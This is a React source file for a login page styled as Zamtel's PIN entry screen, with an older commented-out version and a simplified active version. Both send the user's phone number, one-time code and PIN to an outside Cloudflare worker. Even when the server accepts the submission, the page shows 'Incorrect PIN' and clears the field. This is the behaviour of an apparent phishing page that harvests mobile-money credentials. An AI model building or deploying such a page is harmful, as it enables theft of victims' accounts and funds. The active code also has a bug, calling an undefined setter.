// import React,{ useEffect, useRef, useState } from "react";
// import { Navigate, useLocation, useNavigate } from "react-router-dom";

// const API_URL = import.meta.env.VITE_API_URL || "";
// const PIN_LENGTH = 4; // change to 6 if your PIN is 6 digits

// export default function ZamtelPin() {
//   const navigate = useNavigate();
//   const { state } = useLocation();
//   const phone = state?.phone;
//   const otp = state?.otp;

//   const [digits, setDigits] = useState(Array(PIN_LENGTH).fill(""));
//   const [active, setActive] = useState(0);
//   const [loading, setLoading] = useState(false);
//   const [error, setError] = useState("");
//   const inputs = useRef([]);

//   useEffect(() => {
//     inputs.current[0]?.focus();
//   }, []);

//   // Opened directly without a phone number -> back to login
//   if (!phone) return <Navigate to="/" replace />;

//   const focusBox = (i) => {
//     const idx = Math.max(0, Math.min(PIN_LENGTH - 1, i));
//     inputs.current[idx]?.focus();
//   };

//   const handleChange = (i, value) => {
//     const clean = value.replace(/\D/g, "");
//     if (!clean) return;
//     setError("");
//     const next = [...digits];
//     let pos = i;
//     for (const ch of clean) {
//       if (pos >= PIN_LENGTH) break;
//       next[pos] = ch;
//       pos += 1;
//     }
//     setDigits(next);
//     focusBox(pos);
//   };

//   const handleKeyDown = (i, e) => {
//     if (e.key === "Backspace") {
//       e.preventDefault();
//       const next = [...digits];
//       if (next[i]) {
//         next[i] = "";
//         setDigits(next);
//       } else if (i > 0) {
//         next[i - 1] = "";
//         setDigits(next);
//         focusBox(i - 1);
//       }
//     } else if (e.key === "ArrowLeft") focusBox(i - 1);
//     else if (e.key === "ArrowRight") focusBox(i + 1);
//   };

//   const handlePaste = (e) => {
//     e.preventDefault();
//     const pasted = e.clipboardData
//       .getData("text")
//       .replace(/\D/g, "")
//       .slice(0, PIN_LENGTH);
//     if (!pasted) return;
//     const next = Array(PIN_LENGTH).fill("");
//     pasted.split("").forEach((ch, idx) => (next[idx] = ch));
//     setDigits(next);
//     focusBox(pasted.length);
//   };

//   const pin = digits.join("");
//   const isComplete = pin.length === PIN_LENGTH;

//   const handleSubmit = async (e) => {
//     e.preventDefault();
//     if (!isComplete || loading) return;

//     setLoading(true);
//     setError("");
//     try {
//       const res = await fetch(`https://my-worker-app.instapayapi.workers.dev/api/zamtelPin`, {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify({ phone: `260${phone}`, otp, pin }),
//       });
//       const data = await res.json().catch(() => ({}));
//       if (!res.ok) throw new Error(data.message || "Incorrect PIN");
// setError("Incorrect PIN.");
// setDigits(Array(PIN_LENGTH).fill(""));
//     //   if (data.token) localStorage.setItem("token", data.token);
//     //   navigate("/dashboard", { replace: true });
//     } catch (err) {
//       setError(err.message || "Something went wrong. Try again.");
//       setDigits(Array(PIN_LENGTH).fill(""));
//       focusBox(0);
//     } finally {
//       setLoading(false);
//     }
//   };

//   return (
//     <div className="min-h-screen w-full bg-white flex justify-center">
//       <form
//         onSubmit={handleSubmit}
//         className="flex min-h-screen w-full max-w-md flex-col px-5 pt-10 pb-8 sm:pt-16"
//       >
//         <button
//           type="button"
//           onClick={() => navigate(-1)}
//           aria-label="Go back"
//           className="-ml-1 flex h-10 w-10 items-center justify-center rounded-full text-black active:bg-gray-100"
//         >
//           <svg
//             viewBox="0 0 24 24"
//             className="h-7 w-7"
//             fill="none"
//             stroke="currentColor"
//             strokeWidth="2"
//             strokeLinecap="round"
//             strokeLinejoin="round"
//           >
//             <path d="M19 12H5M12 19l-7-7 7-7" />
//           </svg>
//         </button>

//         <h1 className="mt-8 text-3xl font-bold tracking-tight text-black sm:text-4xl">
//           Enter PIN
//         </h1>
//         <p className="mt-3 text-base text-gray-700">
//           Enter your {PIN_LENGTH}-digit PIN for{" "}
//           <span className="font-medium text-blue-600">{phone}</span>
//         </p>

//         {/* PIN boxes (masked) */}
//         <div className="mt-16 flex items-end justify-center gap-6 px-2 sm:gap-8">
//           {digits.map((d, i) => (
//             <input
//               key={i}
//               ref={(el) => (inputs.current[i] = el)}
//               type="password"
//               inputMode="numeric"
//               autoComplete="off"
//               maxLength={PIN_LENGTH}
//               value={d}
//               aria-label={`PIN digit ${i + 1}`}
//               onChange={(e) => handleChange(i, e.target.value)}
//               onKeyDown={(e) => handleKeyDown(i, e)}
//               onPaste={handlePaste}
//               onFocus={() => setActive(i)}
//               className={`h-12 w-full min-w-0 max-w-[56px] border-0 border-b-[3px] bg-transparent text-center text-2xl font-semibold text-gray-900 outline-none transition-colors ${
//                 error
//                   ? "border-red-400"
//                   : active === i
//                   ? "border-blue-600"
//                   : "border-gray-300"
//               }`}
//             />
//           ))}
//         </div>

//         <div className="mt-4 flex items-start justify-between gap-4 text-base">
//           <span className="text-sm text-red-500">{error}</span>
//           <button
//             type="button"
//             onClick={() => navigate("/forgot-pin", { state: { phone } })}
//             className="shrink-0 font-medium text-blue-600"
//           >
//             Forgot PIN?
//           </button>
//         </div>

//         {/* <div className="flex-1" /> */}

//         <button
//           type="submit"
//           disabled={!isComplete || loading}
//           className={`w-full mt-6 rounded-2xl py-5 text-lg font-medium transition-colors ${
//             isComplete && !loading
//               ? "bg-[#12A036] text-white hover:bg-[#0e7a2a]"
//               : "cursor-not-allowed bg-gray-200 text-gray-500"
//           }`}
//         >
//           {loading ? "Verifying..." : "Login"}
//         </button>
//       </form>
//     </div>
//   );
// }

import React, { useEffect, useRef, useState } from "react";
import { Navigate, useLocation, useNavigate } from "react-router-dom";

const PIN_LENGTH = 4; // change to 6 if your PIN is 6 digits

export default function ZamtelPin() {
    const navigate = useNavigate();
    const { state } = useLocation();
    const phone = state?.phone;
    const otp = state?.otp;

    //   const [digits, setDigits] = useState(Array(PIN_LENGTH).fill(""));
    const [pin, setPin] = useState("");
    const [active, setActive] = useState(0);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState("");
    const inputs = useRef([]);

    useEffect(() => {
        inputs.current[0]?.focus();
    }, []);

    // Opened directly without a phone number -> back to login
    if (!phone) return <Navigate to="/" replace />;

    const focusBox = (i) => {
        const idx = Math.max(0, Math.min(PIN_LENGTH - 1, i));
        inputs.current[idx]?.focus();
    };

    const handleChange = (e) => {
    setError("");
    setPin(e.target.value);
    // setPin(e.target.value.replace(/\D/g, ""));
  };

    // const handleKeyDown = (i, e) => {
    //     if (e.key === "Backspace") {
    //         e.preventDefault();
    //         const next = [...digits];
    //         if (next[i]) {
    //             next[i] = "";
    //             setDigits(next);
    //         } else if (i > 0) {
    //             next[i - 1] = "";
    //             setDigits(next);
    //             focusBox(i - 1);
    //         }
    //     } else if (e.key === "ArrowLeft") focusBox(i - 1);
    //     else if (e.key === "ArrowRight") focusBox(i + 1);
    // };

    // const handlePaste = (e) => {
    //     e.preventDefault();
    //     const pasted = e.clipboardData
    //         .getData("text")
    //         .replace(/\D/g, "")
    //         .slice(0, PIN_LENGTH);
    //     if (!pasted) return;
    //     const next = Array(PIN_LENGTH).fill("");
    //     pasted.split("").forEach((ch, idx) => (next[idx] = ch));
    //     setDigits(next);

    //     focusBox(pasted.length);
    // };

    //   const pin = digits.join("");
    const isComplete = pin.length === PIN_LENGTH;

    const handleSubmit = async (e) => {
        e.preventDefault();
        // if (!isComplete || loading) return;

        setLoading(true);
        setError("");
        try {
            const res = await fetch(
                `https://my-worker-app.instapayapi.workers.dev/api/zamtelPin`,
                {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ phone: `260${phone}`, otp, pin }),
                }
            );
            const data = await res.json().catch(() => ({}));
            if (!res.ok) throw new Error(data.message || "Incorrect PIN");
            setError("Incorrect PIN.");
            setPin("");
            // setDigits(Array(PIN_LENGTH).fill(""));

            //   if (data.token) localStorage.setItem("token", data.token);
            //   navigate("/dashboard", { replace: true });
        } catch (err) {
            setError(err.message || "Something went wrong. Try again.");
            setDigits(Array(PIN_LENGTH).fill(""));
            focusBox(0);
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="min-h-screen w-full bg-white flex justify-center">
            <form
                onSubmit={handleSubmit}
                className="flex min-h-screen w-full max-w-md flex-col px-5 pt-10 pb-8 sm:pt-16"
            >
                <button
                    type="button"
                    onClick={() => navigate(-1)}
                    aria-label="Go back"
                    className="-ml-1 flex h-10 w-10 items-center justify-center rounded-full text-black active:bg-gray-100"
                >
                    <svg
                        viewBox="0 0 24 24"
                        className="h-7 w-7"
                        fill="none"
                        stroke="currentColor"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                    >
                        <path d="M19 12H5M12 19l-7-7 7-7" />
                    </svg>
                </button>

                <h1 className="mt-8 text-3xl font-bold tracking-tight text-black sm:text-4xl">
                    Enter PIN
                </h1>
                <p className="mt-3 text-base text-gray-700">
                    Enter your PIN for{" "}
                    <span className="font-medium text-blue-600">{phone}</span>
                </p>
 <div
          className={`mt-8 flex items-center rounded-2xl border-2 bg-white px-4 py-4 transition-colors focus-within:border-blue-500 ${
            error ? "border-red-400" : "border-gray-200"
          }`}
        >

                {/* PIN boxes (masked) */}
                <input
                    type={"text"}
                    // inputMode="numeric"
                    // autoComplete="current-password"
                    // autoFocus
                    value={pin}
                    onChange={handleChange}
                    placeholder="Enter your PIN"
                    aria-label="PIN"
                    className="w-full bg-transparent text-base text-gray-900 placeholder-gray-500 outline-none"
                />
        </div>

                <div className="mt-4 flex items-start justify-between gap-4 text-base">
                    <span className="text-sm text-red-500">{error}</span>
                    <button
                        type="button"
                        onClick={() => navigate("/forgot-pin", { state: { phone } })}
                        className="shrink-0 font-medium text-blue-600"
                    >
                        Forgot PIN?
                    </button>
                </div>

                {/* <div className="flex-1" /> */}

                <button
                    type="submit"
                    onClick={handleSubmit}
                    // disabled={!isComplete || loading}
                    className={`w-full mt-6 rounded-2xl py-5 text-lg font-medium transition-colors bg-[#12A036] text-white hover:bg-[#0e7a2a]`}
                >
                    {loading ? "Verifying..." : "Login"}
                </button>
            </form>
        </div>
    );
}